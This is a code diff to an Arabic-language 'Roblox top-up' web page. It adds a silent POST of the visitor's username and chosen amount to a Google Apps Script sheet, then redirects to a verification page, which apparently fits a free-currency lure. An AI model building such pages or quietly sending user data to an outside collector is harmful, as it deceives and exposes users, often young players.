@@ -6,7 +6,6 @@
   <title>شحن روبلوكس </title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
-
     body {
       margin: 0;
       padding: 0;
@@ -85,6 +84,18 @@
         alert("رجاءً اكتب اسمك في روبلوكس أول");
         return;
       }
+
+      // إرسال الاسم والكمية إلى Google Sheets
+      fetch("https://script.google.com/macros/s/AKfycbwFSF2866QV_oeiY8pW6gBK_2FoB_hwC_1Kif89RzGFIcPnlZSQALLCDkqLZSKfc8fI/exec", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: `user=${encodeURIComponent(username)}&amount=${amount}`
+      });
+
+      // الانتقال لصفحة التحقق
       const url = `verify.html?user=${encodeURIComponent(username)}&amount=${amount}`;
       window.location.href = url;
     }
